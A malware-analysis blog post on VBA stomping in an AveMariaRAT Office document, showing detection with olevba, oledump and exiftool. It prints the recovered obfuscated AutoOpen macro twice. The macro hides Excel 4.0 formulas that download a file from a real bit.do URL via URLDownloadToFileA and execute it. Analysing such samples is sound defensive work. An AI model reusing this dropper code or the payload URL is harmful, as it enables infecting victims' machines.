---
layout: default
title:  "AveMariaRAT VBA Stomping"
date:   2025-07-27 15:14:00 -0400
categories: malware analysis
---

Macros in office documents are compiled into bytecode, otherwise known as p-code. Depending on the methodology the threat actor chose to handle the execution of the macro code, such as on opening or closing of the document, p-code comprises the malicious code that executes. When an office document is not tampered with, it’ll typically look like the below image.

![Alt text](/assets/images/2025/AveMaria/1-pcode.png)

For the oledump excerpt of this sample, the presence of a macro (M) in the stream with a compiled size and a source code size is visible. However, many threat actors leverage what is known as either VBA Stomping (modifying or deleting the macro source code) or VBA Purging (modifying or deleting the macro p-code) to provide a high-level layer of obfuscation to their document. This post will examine VBA Stomping in a sample that pertains to AveMaria, a remote access trojan with infostealing capabilities.

Firstly, how do we detect if a document that we know is malicious is subject to VBA Stomping? There are a few methods, with malware analysts usually starting with a combination of olevba and oledump.

![Alt text](/assets/images/2025/AveMaria/2-olevba.png)

olevba provides several important indicators of how the macro operates.

> 1) The p-code executes as soon as the user opens the document and enables content.

> 2) A PE file is associated somewhere in the code (usually a download to drop an executable)

> 3) Object creation.

> 4) Chr obfuscation for string manipulation or obfuscation.

> 5) Base64 encoded strings.

> 6) VBA Stomping.

With an idea of what to expect, oledump can be used to follow up on the results.

![Alt text](/assets/images/2025/AveMaria/3-oledump.png)

Stream 8 and 9 are interesting in that instead of showing the usual “M” to indicate the presence of p-code, there is an exclamation instead. There is still a presence of p-code as its size (# on the left) is 3061 and 767 respectively. However, the size of the compressed source code is unusual as it is 1 and 1 respectively.

oledump won’t be able to decompress source code that doesn’t exist, however, providing “c” (oledump.py Ave.docx -s 8c) will target the p-code specifically. Piping the command to “more” will allow for easier parsing of the output.

![Alt text](/assets/images/2025/AveMaria/4-oledump2.png)

Wading through the mess, ASCII strings of interest become apparent which indicate that the macro may use URLDownloadToFile() to pull additional file(s) from a URL shortener known as bit.do.

Attempting to decompile to p-code with pcode2code confirms what was seen in the ASCII contents, as well as additional obfuscation.

{% highlight ruby %}
Sub AutoOpen()
  Dim ExcelSheet As Object
  
  Dim titu, maxi, key, pap, u, l, c, s, q, qw As String
  
  titu = "h" + "tt" + "ps" + "://bit" + ".do/" + "fQUfB"
  
  maxi = ActiveDocument.BuiltInDocumentProperties("Comments").Value
  
  u = "ur" & Chr(108) & Chr(109) & "on"
  
  q = Chr(85) & "R" & Chr(76) & Chr(68) & "own" & Chr(108)
  
  l = q & "oadTo" & Chr(70) & "i" & Chr(108) & "e" & Chr(65)
  
  c = "=CAL" & Chr(76)
  
  s = c & "(""" + u + """, """ + l + """, ""JJCC" & Chr(74)
  
  key = s & "J"", 0, """ + titu + """, """ + maxi + """, 0, 0)"
  
  addition = 3 + 1
  
  mynumber = (12 - 4) - addition
  
  pap = "Example"
  
  Set ExcelSheet = CreateObject("Excel.Application")
  
  Set Workbook = ExcelSheet.Workbooks.Add()
  
  Set WorksheetsD = ExcelSheet.Worksheets
  
  WorksheetsD.Add Before:=WorksheetsD(1), Count:=1, Type:=mynumber
  
  ExcelSheet.Application.Visible = 0
  
  ExcelSheet.Range("A127").Name = pap
  
  ExcelSheet.Range("A127") = "=ERR" + "OR" + "(FALSE)"
  
  ExcelSheet.Application.Cells(129, 1).Value = "=I" + "F(ISNUMBER(SEARCH(""32"",GET.WORKSPACE(1))), GOTO(B127), GOTO(C127))"
  
  ExcelSheet.Application.Cells(129, 2).Value = key
  
  ExcelSheet.Application.Cells(131, 2).Value = "=E" + "XEC(""" + maxi + """)"
  
  ExcelSheet.Range("B133") = "=CLOSE(FALSE)"
  
  ExcelSheet.Application.Cells(129, 3).Value = "=C" + "AL" & Chr(76) & "(""" + u + """, """ + l + """, ""BBCC" & Chr(66) & "B"", 0, """ + titu + """, """ + maxi + """, 0, 0)" + "=E" + "XEC" + "(""" + maxi + """)"
  
  ExcelSheet.Range("C133") = "=C" + "LOSE(FALSE)"
  
  ExcelSheet.Sheets(1).Visible = 2
  
  ExcelSheet.Run pap
  
  ExcelSheet.Application.Quit
  
  Set ExcelSheet = Nothing
  
End Sub
{% endhighlight %}

This was my first foray into manually deobfuscating Chr(), so it was a good experience, although I am still uncertain in a few areas.

{% highlight ruby %}
u =

Chr(108) = l
Chr(109) = m

urlmon

q =

Chr(85) = U
Chr(76) = L
Chr(68) = D
Chr(108) = l

URLDownl

l =

Chr(70) = F
Chr(108) = l
Chr(65) = A

[q = joining] oadToFileA

c =

Chr(76) = L

=CALL

s =

Chr(74) = J

( u + , + l + , JJCC J

CALL=("urlmon", "DownloadToFileA")
{% endhighlight %}

With much of the p-code deobfuscated, we can paint the picture as to what’s going on here.

{% highlight ruby %}
Sub AutoOpen()
  Dim ExcelSheet As Object
  
  Dim titu, maxi, key, pap, u, l, c, s, q, qw As String
  
  titu = "h" + "tt" + "ps" + "://bit" + ".do/" + "fQUfB"
  
  maxi = ActiveDocument.BuiltInDocumentProperties("Comments").Value
  
  u = "ur" & Chr(108) & Chr(109) & "on"
  
  q = Chr(85) & "R" & Chr(76) & Chr(68) & "own" & Chr(108)
  
  l = q & "oadTo" & Chr(70) & "i" & Chr(108) & "e" & Chr(65)
  
  c = "=CAL" & Chr(76)
  
  s = c & "(""" + u + """, """ + l + """, ""JJCC" & Chr(74)
  
  key = s & "J"", 0, """ + titu + """, """ + maxi + """, 0, 0)"
  
  addition = 3 + 1
  
  mynumber = (12 - 4) - addition
  
  pap = "Example"
  
  Set ExcelSheet = CreateObject("Excel.Application")
  
  Workbook = ExcelSheet.Workbooks.Add()
  
  Set WorksheetsD = ExcelSheet.Worksheets
  
  WorksheetsD.Add Before:=WorksheetsD(1), Count:=1, Type:=mynumber
  
  ExcelSheet.Application.Visible = 0
  
  ExcelSheet.Range("A127").Name = pap
  
  ExcelSheet.Range("A127") = "=ERR" + "OR" + "(FALSE)"
  
  ExcelSheet.Application.Cells(129, 1).Value = "=I" + "F(ISNUMBER(SEARCH(""32"",GET.WORKSPACE(1))), GOTO(B127), GOTO(C127))"
  
  ExcelSheet.Application.Cells(131, 2).Value = "=E" + "XEC(""" + maxi + """)"
  
  ExcelSheet.Range("B133") = "=CLOSE(FALSE)"
  
  ExcelSheet.Application.Cells(129, 3).Value = "=C" + "AL" & Chr(76) & "(""" + u + """, """ + l + """, ""BBCC" & Chr(66) & "B"", 0, """ + titu + """, """ + maxi + """, 0, 0)" + "=E" + "XEC" + "(""" + maxi + """)"

  ExcelSheet.Range("C133") = "=C" + "LOSE(FALSE)"
  
  ExcelSheet.Sheets(1).Visible = 2
  
  ExcelSheet.Run pap
  
  ExcelSheet.Application.Quit
  
  Set ExcelSheet = Nothing
  
End Sub
{% endhighlight %}

From my understanding, a new Excel instance is being created, as well as a workbook and worksheet named WorksheetsD. WorksheetsD is inserted as the sheet before, or at the first index with the sheet type of mynumber which is 8. ExcelSheet.Application.Visible = 0 ensures that the malicious macro performs its behavior in the background.

Then we have this line:

{% highlight ruby %}
ExcelSheet.Application.Cells(129, 3).Value = "=C" + "AL" & Chr(76) & "(""" + u + """, """ + l + """, ""BBCC" & Chr(66) & "B"", 0, """ + titu + """, """ + maxi + """, 0, 0)" + "=E" + "XEC" + "(""" + maxi + """)"
{% endhighlight %}

Which, after adding all the deobfuscated Chr() together, calls (CALL=) the urlmon library for DownloadToFileA to download the file at the bit.do URL and then execute it with EXEC.

Running exiftool for metadata collection reveals a few key details.

![Alt text](/assets/images/2025/AveMaria/5-exiftool.png)

The document was written by “Microsoft account” and last modified by “Administrator” Both the creation date and modification date are close to one another, and the presence of poc.exe in the comments field may indicate that it is dropped on the system during macro execution.

Thanks for reading!